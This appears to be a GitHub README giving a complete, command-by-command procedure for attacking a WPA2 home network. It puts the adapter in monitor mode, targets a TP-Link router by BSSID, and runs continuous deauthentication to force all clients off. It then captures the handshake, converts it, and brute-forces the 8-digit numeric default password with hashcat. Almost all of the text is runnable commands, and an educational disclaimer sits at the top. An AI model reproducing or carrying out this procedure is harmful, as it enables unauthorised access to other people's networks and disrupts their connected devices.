# 🚨 WiFi Deauthentication & WPA2 Cracking using Hashcat

> ⚠️ **Disclaimer:** This guide is strictly for educational purposes and ethical hacking within authorized environments. Do **not** attempt on networks without explicit permission.

Many TP-Link routers ship with a default 8-digit numeric WiFi password (e.g., `12345678`) printed on the back label. This predictable pattern makes them a prime target for brute-force attacks — the exact scenario demonstrated here.

## 🧰 Requirements

- 🐧 Kali Linux
- 📡 Compatible WiFi adapter (supports monitor mode & packet injection)
- 🔧 Tools used:
  - `airmon-ng`
  - `airodump-ng`
  - `aireplay-ng`
  - `hcxpcapngtool`
  - `hashcat`

## 🛠️ Step-by-Step Process

### 1️⃣ Check WiFi Dongle Connection

```bash
iwconfig
```

✅ Ensure your dongle (e.g., wlan1) is detected and in `Managed` mode.

### 2️⃣ Enable Monitor Mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
iwconfig
```

🔄 This puts your interface in `Monitor` mode. Confirm using `iwconfig`.

### 3️⃣ Discover Nearby WiFi Networks

```bash
sudo airodump-ng wlan1
```

🔍 Find your target network and note the following:

- 📶 SSID: TP-Link\_2646
- 📺 Channel: 4
- 🆔 BSSID: C0\:C9\:E3:83:26:46

### 4️⃣ Target the Specific Network

```bash
sudo airodump-ng wlan1 -d C0:C9:E3:83:26:46
```

🎯 Filters to show only the selected WiFi network.

### 5️⃣ Deauthenticate Connected Devices

In a **new terminal**, run:

```bash
sudo aireplay-ng --deauth 0 -a C0:C9:E3:83:26:46 wlan1
```

🔨 This forces all connected devices to disconnect, prompting handshake reauthentication.

### 6️⃣ Capture WPA2 Handshake

In the original terminal:

```bash
sudo airodump-ng -w hack1 -c 4 --bssid C0:C9:E3:83:26:46 wlan1
```

💾 Options:

- `-w hack1`: Saves to `hack1-01.cap`
- `-c 4`: Locks to channel 4
- `--bssid`: Targets the specific router

### 7️⃣ Convert .cap to .hc22000 Format

```bash
sudo hcxpcapngtool -o wpa2.hc22000 hack1-01.cap
```

🔄 Converts the capture file into a format readable by Hashcat.

### 8️⃣ Brute-Force the WPA2 Password

```bash
hashcat -m 22000 -a 3 wpa2.hc22000 ?d?d?d?d?d?d?d?d
```

🧠 Explanation:

- `-m 22000`: WPA2 handshake format
- `-a 3`: Brute-force attack
- `?d?d?d?d?d?d?d?d`: Pattern for 8-digit numeric password

### 9️⃣ (Optional) Restart Network Manager

```bash
sudo service NetworkManager restart
```

🔧 Restores regular network functionality after monitor mode.

## ✅ Summary

Using this method, a default 8-digit numeric password of a TP-Link router was successfully cracked. 🔓 This demonstrates the risk of weak/default WiFi passwords.

---## 📄 License

[MIT](LICENSE) — Educational use only. See the [LICENSE](LICENSE) file for details.

